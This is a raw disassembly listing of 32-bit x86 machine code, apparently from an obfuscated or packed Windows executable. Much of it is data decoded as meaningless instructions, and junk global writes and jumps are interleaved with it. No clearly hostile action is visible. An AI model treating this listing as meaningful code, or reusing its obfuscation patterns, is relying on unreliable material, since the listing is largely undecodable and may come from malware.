  40dc29:	pop    ecx
  40dc2a:	dec    ebx
  40dc2b:	mov    ds:0xf3fbb1a5,al
  40dc30:	xchg   BYTE PTR [ecx+esi*4-0x48],bh
  40dc34:	daa    
  40dc35:	xchg   edx,eax
  40dc36:	sub    cl,BYTE PTR es:[edx-0x30]
  40dc3a:	shl    DWORD PTR [ebx+0x21],1
  40dc3d:	push   esp
  40dc3e:	jnp    0x40dbc9
  40dc40:	mov    ebx,0xc18a84c0
  40dc45:	ds scas eax,DWORD PTR es:[edi]
  40dc47:	mov    BYTE PTR [ebp-0x61a5700b],dh
  40dc4d:	fsubr  DWORD PTR [ecx+ecx*1]
  40dc50:	jge    0x40dcab
  40dc52:	(bad)  
  40dc54:	test   eax,0x9c17ea09
  40dc59:	(bad)  
  40dc5a:	sti    
  40dc5b:	lahf   
  40dc5c:	dec    eax
  40dc5d:	int    0xa9
  40dc5f:	into   
  40dc60:	adc    ecx,DWORD PTR [eax-0x1f]
  40dc63:	sahf   
  40dc64:	fild   DWORD PTR [ecx-0x7d]
  40dc67:	cmc    
  40dc68:	xor    dh,BYTE PTR [esi-0x6b11ac37]
  40dc6e:	xlat   BYTE PTR ds:[ebx]
  40dc6f:	and    esp,DWORD PTR [ebx+0x60ca962e]
  40dc75:	mov    eax,ds:0x7dac7577
  40dc7a:	jmp    0x9b28:0x9e979c02
  40dc81:	leave  
  40dc82:	sub    edi,ebp
  40dc84:	inc    esp
  40dc85:	dec    edx
  40dc86:	inc    ebx
  40dc87:	repnz push ds
  40dc89:	mov    ecx,0x28db3035
  40dc8e:	jle    0x40dc33
  40dc90:	sbb    edx,DWORD PTR [ebp+0x6511e39f]
  40dc96:	and    al,0xe8
  40dc98:	cmp    DWORD PTR [esi+edi*8],eax
  40dc9b:	fisub  DWORD PTR [edi+0x7bc1fea]
  40dca1:	mov    edx,0xa8ccf2af
  40dca6:	jns    0x40dc6b
  40dca8:	pop    ds
  40dca9:	dec    ecx
  40dcaa:	pop    ebx
  40dcab:	loope  0x40dcf8
  40dcad:	jno    0x40dce2
  40dcaf:	or     edi,DWORD PTR [edi-0x17]
  40dcb2:	mov    esi,0x4da8f3ac
  40dcb7:	cmp    DWORD PTR [eax],eax
  40dcb9:	es push 0x42
  40dcbc:	adc    al,dl
  40dcbe:	adc    dh,BYTE PTR [ecx+0x3c]
  40dcc1:	pop    ebx
  40dcc2:	mov    bh,0x1c
  40dcc4:	paddsw mm6,QWORD PTR [eax-0x44ed791f]
  40dccb:	pop    eax
  40dccc:	sub    dl,ah
  40dcce:	call   0x8c2f3383
  40dcd3:	mov    esi,0x81f50a97
  40dcd8:	adc    DWORD PTR [edi-0x10faac76],esi
  40dcde:	and    DWORD PTR [ecx+0x73],edx
  40dce1:	mov    eax,ds:0xe2cf552d
  40dce6:	adc    al,0x36
  40dce8:	js     0x40dd4d
  40dcea:	mov    dl,BYTE PTR [edi*1-0x1eb81811]
  40dcf1:	adc    DWORD PTR [esi+0x6e],ebp
  40dcf4:	cs nop
  40dcf6:	inc    edx
  40dcf7:	xchg   ebp,eax
  40dcf8:	xor    BYTE PTR [ebx-0x67539556],0xb5
  40dcff:	ins    DWORD PTR es:[edi],dx
  40dd00:	xchg   ecx,eax
  40dd01:	sub    DWORD PTR fs:[eax],ecx
  40dd04:	jp     0x40dd3a
  40dd06:	data16 and BYTE PTR [esi-0xc],bh
  40dd0a:	adc    eax,0x15f3802e
  40dd0f:	cmp    DWORD PTR fs:[eax-0x7cca4c3a],ecx
  40dd16:	mov    edi,0x5a94dd20
  40dd1b:	fidivr DWORD PTR [esi-0x69]
  40dd1e:	or     al,0xa4
  40dd20:	push   eax
  40dd21:	nop
  40dd22:	imul   esi
  40dd24:	ds mov bl,0xb1
  40dd27:	arpl   WORD PTR [esi+eax*2],dx
  40dd2a:	sbb    al,BYTE PTR [ebx+0x72]
  40dd2d:	nop
  40dd2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd2f:	xor    al,0xc3
  40dd31:	push   edx
  40dd32:	lea    ebx,[edx+0x1d65fa3e]
  40dd38:	call   0xd743:0x1c8989e5
  40dd3f:	es xchg ebp,eax
  40dd41:	jmp    0xdfc2772e
  40dd46:	fs push eax
  40dd48:	push   0x48
  40dd4a:	aas    
  40dd4b:	fs xchg ecx,eax
  40dd4d:	mov    al,0xe1
  40dd4f:	inc    ebp
  40dd50:	mov    BYTE PTR cs:[ebp+0x4b],bh
  40dd54:	mov    al,0x20
  40dd56:	iret   
  40dd57:	cwde   
  40dd58:	sub    eax,0x6857dd35
  40dd5d:	imul   esi,ecx,0xe8348abc
  40dd63:	scas   al,BYTE PTR es:[di]
  40dd65:	nop
  40dd66:	jg     0x40dd49
  40dd68:	lea    ebx,[eax-0x2e57aa0b]
  40dd6e:	(bad)  
  40dd70:	mov    esi,0x59b12f7d
  40dd75:	jnp    0x40dd6b
  40dd77:	or     eax,0xa453e2b3
  40dd7c:	dec    esp
  40dd7d:	inc    ecx
  40dd7e:	sbb    esp,DWORD PTR [esi-0x72]
  40dd81:	inc    edx
  40dd82:	or     DWORD PTR [edi-0x34adba26],0xea3a3a73
  40dd8c:	les    esp,FWORD PTR [esi-0x60]
  40dd8f:	mov    ds:0x1d1556ee,eax
  40dd94:	jl     0x40dd65
  40dd96:	nop
  40dd97:	lods   eax,DWORD PTR ds:[esi]
  40dd98:	push   ss
  40dd99:	mov    ch,0x79
  40dd9b:	mov    ds:0xa66214e2,al
  40dda0:	push   0xffffffe2
  40dda2:	fisub  DWORD PTR ds:0xfd5f2667
  40dda8:	xor    eax,0x8fbeb3d1
  40ddad:	lea    ebx,[edx+ebp*8]
  40ddb0:	sub    al,0xb5
  40ddb2:	test   eax,0x6490d722
  40ddb7:	outs   dx,BYTE PTR ds:[esi]
  40ddb8:	xor    ecx,eax
  40ddba:	xor    DWORD PTR ds:0xeedb86a5,esp
  40ddc0:	xchg   esp,eax
  40ddc1:	and    al,0xc0
  40ddc3:	mov    dh,0xae
  40ddc5:	(bad)  
  40ddc6:	icebp  
  40ddc7:	inc    ah
  40ddc9:	adc    al,0x64
  40ddcb:	push   ecx
  40ddcc:	inc    ebp
  40ddcd:	dec    edi
  40ddce:	das    
  40ddcf:	ins    DWORD PTR es:[edi],dx
  40ddd0:	cmp    DWORD PTR [eax],esp
  40ddd2:	dec    esi
  40ddd3:	fcomp  QWORD PTR [ecx]
  40ddd5:	jbe    0x40de3e
  40ddd7:	lahf   
  40ddd8:	out    0x68,al
  40ddda:	in     eax,0x46
  40dddc:	call   0x1bd6a542
  40dde1:	stos   DWORD PTR es:[edi],eax
  40dde2:	or     eax,ebx
  40dde4:	pop    eax
  40dde5:	adc    al,BYTE PTR [eax+0x3a7a9621]
  40ddeb:	xchg   edx,eax
  40ddec:	sub    BYTE PTR [ecx-0x417e756e],bh
  40ddf2:	jno    0x40dd83
  40ddf4:	mov    dl,0xe4
  40ddf6:	sub    ch,BYTE PTR [bx-0x4fe5]
  40ddfb:	xchg   ebx,eax
  40ddfc:	stc    
  40ddfd:	(bad)  
  40ddfe:	cdq    
  40ddff:	sbb    DWORD PTR [eax+ebp*2-0x7bf76edb],edi
  40de06:	ret    0xa8fe
  40de09:	aaa    
  40de0a:	int3   
  40de0b:	scas   eax,DWORD PTR es:[edi]
  40de0c:	xor    DWORD PTR [ecx+eax*1-0x621955ed],ebx
  40de13:	mov    ebx,ecx
  40de15:	xchg   ebx,eax
  40de16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de17:	je     0x40de14
  40de19:	adc    al,0x15
  40de1b:	cmp    al,0xc2
  40de1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1e:	jmp    0x40de23
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	idiv   DWORD PTR [ebx+eax*1-0x65]
  40dea9:	jb     0x40de65
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40dea6
  40deb3:	lock mov bh,al
  40deb6:	das    
  40deb7:	fs mov ch,0xfc
  40deba:	jl     0x40df13
  40debc:	mov    ebp,DWORD PTR [esi]
  40debe:	sbb    al,BYTE PTR [edx]
  40dec0:	mov    ebx,0xa5ab7aec
  40dec5:	cmp    eax,0x129f96ce
  40deca:	cld    
  40decb:	out    dx,eax
  40decc:	cmova  ebx,DWORD PTR [eax+edx*4]
  40ded0:	jmp    0x40df20
  40ded2:	cdq    
  40ded3:	add    DWORD PTR cs:[esi],0x16
  40ded7:	stc    
  40ded8:	loop   0x40dee2
  40deda:	inc    ebx
  40dedb:	and    ebp,DWORD PTR [ebp+0x6d]
  40dede:	push   ebx
  40dedf:	mov    esi,0xe3f4efa9
  40dee4:	scas   al,BYTE PTR es:[edi]
  40dee5:	imul   esp,DWORD PTR [edx+0x54],0x5d97046a
  40deec:	std    
  40deed:	pop    ss
  40deee:	adc    esi,DWORD PTR [edx-0x6c]
  40def1:	loop   0x40df3f
  40def3:	inc    ecx
  40def4:	cmp    esp,ebx
  40def6:	jecxz  0x40df1a
  40def8:	ret    0x2f4b
  40defb:	jno    0x40de9b
  40defd:	sub    al,0x59
  40deff:	and    BYTE PTR ds:0x71462a44,dh
  40df05:	dec    ebx
  40df06:	cmc    
  40df07:	mov    al,ds:0x94c23fd8
  40df0c:	cmp    eax,DWORD PTR [esi+0x33f0137c]
  40df12:	push   eax
  40df13:	fs push 0x7b0335
  40df19:	pusha  
  40df1a:	push   edx
  40df1b:	or     dh,ch
  40df1d:	xchg   edx,eax
  40df1e:	ins    DWORD PTR es:[edi],dx
  40df1f:	mov    eax,0x54985b3b
  40df24:	dec    edx
  40df25:	test   eax,0x1d52aeeb
  40df2a:	sahf   
  40df2b:	sub    DWORD PTR [edi+0x4d036b2b],edx
  40df31:	mov    al,0xe6
  40df33:	adc    bh,BYTE PTR [eax-0x2a]
  40df36:	leave  
  40df37:	inc    eax
  40df38:	mov    ebp,0x626c3a6
  40df3d:	push   ds
  40df3e:	dec    DWORD PTR [eax]
  40df40:	sub    bl,BYTE PTR [esi+0x450afefd]
  40df46:	push   esi
  40df47:	test   BYTE PTR [eax],al
  40df49:	pusha  
  40df4a:	hlt    
  40df4b:	mov    WORD PTR [ebp+edx*4-0x1aed31ba],cs
  40df52:	pushf  
  40df53:	dec    esp
  40df54:	xchg   BYTE PTR [edi],ah
  40df56:	and    dl,BYTE PTR [esi+0x26]
  40df59:	lock pop es
  40df5b:	push   ebx
  40df5c:	mov    BYTE PTR [ebx+ecx*2],ch
  40df5f:	sub    dh,cl
  40df61:	jge    0x40df8b
  40df63:	(bad)  ss:[ecx+eiz*8]
  40df67:	push   0x8f17e44e
  40df6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df6d:	lds    edx,FWORD PTR [ebx+0x674095ca]
  40df73:	sub    al,0xb1
  40df75:	jecxz  0x40dfa0
  40df77:	mov    ebx,0x7b61701f
  40df7c:	(bad)  
  40df7d:	(bad)  [ebp-0x563debb6]
  40df83:	test   al,0x98
  40df85:	xor    DWORD PTR [edx],ebp
  40df87:	nop
  40df88:	and    BYTE PTR [ebp-0x2665ca8],dl
  40df8e:	add    eax,0xcf7bc6de
  40df93:	fsub   QWORD PTR [esi-0x42b22584]
  40df99:	inc    ebp
  40df9a:	mov    al,0xd2
  40df9c:	fcomp  QWORD PTR [edi+0x20767a9a]
  40dfa2:	add    edi,DWORD PTR [ebx+edi*2-0x59f7304b]
  40dfa9:	inc    edx
  40dfaa:	in     eax,dx
  40dfab:	rcr    DWORD PTR [edi],1
  40dfad:	mov    al,ds:0xddc65653
  40dfb2:	push   0x2c140261
  40dfb7:	lea    esi,[edi+esi*4+0x5bfb0b1a]
  40dfbe:	cmp    BYTE PTR [edi+edi*8-0x40cd2f6b],bl
  40dfc5:	xchg   DWORD PTR [ecx-0x79cf460b],ebp
  40dfcb:	mov    esp,ds
  40dfcd:	sbb    al,0x8b
  40dfcf:	inc    ebp
  40dfd0:	or     BYTE PTR [ecx+0x4338172d],al
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	cli    
  40e004:	mov    edi,0x9d5ec684
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e017
  40e010:	sbb    BYTE PTR [eax+ecx*4+0x12c5a564],al
  40e017:	fisubr DWORD PTR [ebx-0x5]
  40e01a:	mov    edx,0xbaed03bf
  40e01f:	ror    eax,cl
  40e021:	dec    ecx
  40e022:	cs pop ax
  40e025:	dec    edi
  40e026:	(bad)  
  40e027:	and    al,0xb4
  40e029:	(bad)  
  40e02a:	jae    0x40dfcf
  40e02c:	adc    DWORD PTR ds:0x2b8e772b,esp
  40e032:	or     esp,DWORD PTR [edx-0x6464c83]
  40e038:	leave  
  40e039:	jne    0x40e052
  40e03b:	out    0x32,eax
  40e03d:	sti    
  40e03e:	inc    edx
  40e03f:	mov    al,ch
  40e041:	xchg   edx,eax
  40e042:	mov    esi,0xbb7ba479
  40e047:	dec    ebp
  40e048:	mov    dl,0x67
  40e04a:	into   
  40e04b:	mov    al,0x72
  40e04d:	inc    ebx
  40e04e:	lods   eax,DWORD PTR ds:[esi]
  40e04f:	mov    ds:0x7ec6c95d,al
  40e054:	mov    dl,0x2d
  40e056:	add    eax,0x5469a29c
  40e05b:	and    al,0x81
  40e05d:	or     DWORD PTR [ebp-0x57daecb3],esi
  40e063:	pop    eax
  40e064:	add    cl,dh
  40e066:	data16 xor dh,BYTE PTR [edi-0x1b807d0]
  40e06d:	dec    ebx
  40e06e:	sbb    ebp,DWORD PTR [eax-0x6f51e588]
  40e074:	dec    ecx
  40e075:	cld    
  40e076:	(bad)  
  40e077:	lea    ebp,[edi+0xde0bd5a]
  40e07d:	int3   
  40e07e:	dec    esi
  40e07f:	shl    DWORD PTR [ecx+0x3c],1
  40e082:	xor    eax,0xcdcc2642
  40e087:	xchg   ebp,eax
  40e088:	je     0x40e0ee
  40e08a:	fild   QWORD PTR [ebp-0x24]
  40e08d:	adc    esi,ebx
  40e08f:	(bad)  
  40e090:	cld    
  40e091:	adc    BYTE PTR [ecx+0x5f],dh
  40e094:	mov    dh,0x4b
  40e096:	popa   
  40e097:	lods   al,BYTE PTR ds:[esi]
  40e098:	js     0x40e116
  40e09a:	sbb    ecx,ecx
  40e09c:	aam    0x43
  40e09e:	jne    0x40e0a5
  40e0a0:	leave  
  40e0a1:	mov    dh,0x27
  40e0a3:	mov    ah,0xb9
  40e0a5:	fmul   QWORD PTR [ecx]
  40e0a7:	jnp    0x40e0ce
  40e0a9:	xchg   ebx,eax
  40e0aa:	mov    ebx,0x7790a007
  40e0af:	rol    DWORD PTR [esi],1
  40e0b1:	add    dl,BYTE PTR [edi]
  40e0b3:	xor    al,0x98
  40e0b5:	out    0xa6,al
  40e0b7:	loop   0x40e069
  40e0b9:	jge    0x40e11d
  40e0bb:	arpl   WORD PTR [edi-0x26],si
  40e0be:	xor    al,0xe
  40e0c0:	mov    BYTE PTR [edi+0x4cc0fe3f],0x65
  40e0c7:	mov    ebp,0xbcc01150
  40e0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0cd:	mov    esp,0x72a6b3cf
  40e0d2:	pop    esi
  40e0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d4:	mov    WORD PTR es:[esi+0x1a49821e],?
  40e0db:	xor    DWORD PTR [ebx],esp
  40e0dd:	push   edx
  40e0de:	sub    edx,ecx
  40e0e0:	hlt    
  40e0e1:	sbb    BYTE PTR [ebx*2+0x785700ce],0x70
  40e0e9:	dec    ecx
  40e0ea:	aas    
  40e0eb:	sbb    BYTE PTR [ebp-0x7ca0f732],cl
  40e0f1:	gs mov edx,0x610ec37d
  40e0f7:	sub    BYTE PTR [eax-0x3a734ea7],bh
  40e0fd:	mov    bh,0x1b
  40e0ff:	mov    edi,0xe35c27a8
  40e104:	iret   
  40e105:	jle    0x40e12e
  40e107:	ss push ss
  40e109:	xchg   ecx,eax
  40e10a:	or     BYTE PTR [esi+0x54],ch
  40e10d:	addr16 (bad) 
  40e10f:	cmp    al,BYTE PTR [ebx+edx*2+0xd]
  40e113:	lds    esi,FWORD PTR [esi-0x42]
  40e116:	lods   eax,DWORD PTR ds:[esi]
  40e117:	xor    al,0x61
  40e119:	sahf   
  40e11a:	dec    ecx
  40e11b:	(bad)  
  40e11c:	leave  
  40e11d:	mov    al,0x9b
  40e11f:	ja     0x40e112
  40e121:	sbb    DWORD PTR [edi+0x62754a0b],0xffffffc8
  40e128:	in     eax,0x93
  40e12a:	imul   esi,DWORD PTR [ebx],0xffffffc6
  40e12d:	adc    DWORD PTR ds:0x433823,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	pop    edx
  40e15b:	shl    al,cl
  40e15d:	shl    BYTE PTR [edx-0x66],0x7e
  40e161:	jle    0x40e175
  40e163:	jg     0x40e1e3
  40e165:	jle    0x40e1c0
  40e167:	inc    ebp
  40e168:	lahf   
  40e169:	stos   DWORD PTR es:[edi],eax
  40e16a:	mov    ds:0x86f48bd3,eax
  40e16f:	pop    edi
  40e170:	imul   esp,ebp,0x13fd6836
  40e176:	and    eax,0x71d477d6
  40e17b:	or     DWORD PTR [eax+0x28],edx
  40e17e:	fisub  DWORD PTR [ebx-0x5f]
  40e181:	jp     0x40e168
  40e183:	div    ecx
  40e185:	sub    eax,0x7c742a26
  40e18a:	push   edx
  40e18b:	mov    edi,0x9ae7cf1c
  40e190:	add    ah,BYTE PTR [ecx+0x7b]
  40e193:	and    al,0x6e
  40e195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e196:	or     BYTE PTR [esi],dl
  40e198:	in     al,0x4e
  40e19a:	stos   DWORD PTR es:[edi],eax
  40e19b:	dec    eax
  40e19c:	out    dx,al
  40e19d:	stos   BYTE PTR es:[edi],al
  40e19e:	push   ds
  40e19f:	or     eax,0x7a6a984c
  40e1a4:	aad    0x82
  40e1a6:	xor    edi,DWORD PTR [edx-0x3725da45]
  40e1ac:	enter  0x3d28,0x80
  40e1b0:	clc    
  40e1b1:	or     eax,0xc57e5fa1
  40e1b6:	pop    edi
  40e1b7:	fdiv   QWORD PTR [esi+0x35]
  40e1ba:	ins    DWORD PTR es:[edi],dx
  40e1bb:	mov    ebx,0x27f72c60
  40e1c0:	lahf   
  40e1c1:	sub    ah,BYTE PTR [ebp-0x64822761]
  40e1c7:	dec    edi
  40e1c8:	sbb    dh,cl
  40e1ca:	mov    esi,0xba374cb9
  40e1cf:	loopne 0x40e1b6
  40e1d1:	mov    al,ds:0x86cfdf9
  40e1d6:	cmp    eax,0xe00ea35c
  40e1db:	jae    0x40e238
  40e1dd:	xchg   esi,eax
  40e1de:	mov    al,0xe8
  40e1e0:	aad    0x96
  40e1e2:	jae    0x40e260
  40e1e4:	cmc    
  40e1e5:	adc    DWORD PTR [ecx+0x6f],esi
  40e1e8:	inc    ecx
  40e1e9:	into   
  40e1ea:	iret   
  40e1eb:	dec    eax
  40e1ec:	mov    ebp,0xe150f8e0
  40e1f1:	or     edi,DWORD PTR [ecx]
  40e1f3:	and    bl,BYTE PTR [ebx+0x112bc9ee]
  40e1f9:	retf   
  40e1fa:	shl    BYTE PTR fs:[ecx+0x65],cl
  40e1fe:	iret   
  40e1ff:	mov    eax,0x5630de77
  40e204:	jle    0x40e18b
  40e206:	outs   dx,BYTE PTR ds:[esi]
  40e207:	inc    ebx
  40e208:	das    
  40e209:	sub    al,0x21
  40e20b:	je     0x40e227
  40e20d:	pushf  
  40e20e:	out    dx,al
  40e20f:	sahf   
  40e210:	sub    BYTE PTR [ebx+0x140d203],cl
  40e216:	inc    edx
  40e217:	adc    al,0xaf
  40e219:	dec    esi
  40e21a:	imul   esp,DWORD PTR [edi-0x638c7762],0x8be2639b
  40e224:	xor    eax,0xc6e271a3
  40e229:	pushf  
  40e22a:	sub    DWORD PTR [edx-0x511758a5],eax
  40e230:	and    edi,DWORD PTR [ebx]
  40e232:	cs aaa 
  40e234:	mov    ?,WORD PTR [edi]
  40e236:	mov    cl,0xf2
  40e238:	ret    
  40e239:	pop    bp
  40e23b:	xlat   BYTE PTR ds:[ebx]
  40e23c:	or     eax,0x1224a2b1
  40e241:	jns    0x40e1f3
  40e243:	imul   ecx,DWORD PTR es:[ebp+ecx*4-0x24b9e121],0x915d89f2
  40e24f:	loopne 0x40e240
  40e251:	aam    0xee
  40e253:	pop    ds
  40e254:	repnz mov WORD PTR [ebp+0x400a575b],ss
  40e25b:	arpl   WORD PTR [esi],cx
  40e25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e25e:	mov    ah,0x96
  40e260:	push   esp
  40e261:	dec    ecx
  40e262:	cli    
  40e263:	cdq    
  40e264:	jbe    0x40e20d
  40e266:	jmp    0x8ffb:0xdfbd9674
  40e26d:	and    bl,BYTE PTR [edx]
  40e26f:	cmp    DWORD PTR [ebx-0x7d],0xbfd0078c
  40e276:	lods   eax,DWORD PTR ds:[esi]
  40e277:	sub    bh,bh
  40e279:	shufps xmm0,XMMWORD PTR [ebp+esi*4+0x3a92bfa7],0x15
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	loopne 0x40e446
  40e416:	out    0xd9,al
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e44e
  40e421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e422:	(bad)  
  40e423:	cs in  al,dx
  40e425:	or     al,0x60
  40e427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e428:	leave  
  40e429:	sbb    ebx,0x3c8f1a6
  40e42f:	sbb    DWORD PTR [eax-0x71589389],edx
  40e435:	fstp   DWORD PTR [ecx]
  40e437:	mov    eax,eax
  40e439:	jne    0x40e3de
  40e43b:	shl    DWORD PTR [edx-0x2b],1
  40e43e:	rep outs dx,BYTE PTR ds:[esi]
  40e440:	out    0xc9,eax
  40e442:	daa    
  40e443:	mov    al,ds:0x6e63caab
  40e448:	cmp    BYTE PTR ds:0x69f922b3,bl
  40e44e:	arpl   WORD PTR [edi],bx
  40e450:	arpl   WORD PTR [ebp+0x19],dx
  40e453:	mov    edx,edi
  40e455:	(bad)  
  40e456:	cmp    al,0xbe
  40e458:	add    al,0x46
  40e45a:	shr    DWORD PTR [eax-0x4f6d749f],0xd3
  40e461:	xchg   ecx,eax
  40e462:	stos   BYTE PTR es:[edi],al
  40e463:	cmp    DWORD PTR [edx],esi
  40e465:	dec    ecx
  40e466:	clc    
  40e467:	call   0x78cebd17
  40e46c:	adc    eax,0xa574dba2
  40e471:	jl     0x40e437
  40e473:	in     al,dx
  40e474:	mov    esi,0x16ae9cff
  40e479:	and    edx,DWORD PTR [eax]
  40e47b:	sub    bl,BYTE PTR [eax-0x28]
  40e47e:	mov    ch,cl
  40e480:	mov    ch,0x38
  40e482:	test   BYTE PTR [esi],cl
  40e484:	sbb    BYTE PTR [edi+0xc],ah
  40e487:	or     eax,0x941f2675
  40e48c:	and    al,0x6
  40e48e:	(bad)  
  40e48f:	and    DWORD PTR [eax],ebp
  40e491:	sub    al,0x84
  40e493:	push   0x44
  40e495:	push   esi
  40e496:	push   cs
  40e497:	les    esi,FWORD PTR [ebx+0x44863cd5]
  40e49d:	mov    bl,0xc
  40e49f:	push   ds
  40e4a0:	jp     0x40e4e8
  40e4a2:	dec    esp
  40e4a3:	mov    DWORD PTR [edi-0x408dbc06],edx
  40e4a9:	mov    dh,0xd
  40e4ab:	cmp    al,0x2
  40e4ad:	jne    0x40e478
  40e4af:	lea    esi,[ebx+0xc]
  40e4b2:	in     al,dx
  40e4b3:	jmp    0x4f03:0x4addfbcb
  40e4ba:	mov    ah,0xfe
  40e4bc:	jmp    0x40e4eb
  40e4be:	add    ecx,DWORD PTR [eax+0x73]
  40e4c1:	sti    
  40e4c2:	inc    edx
  40e4c3:	dec    edi
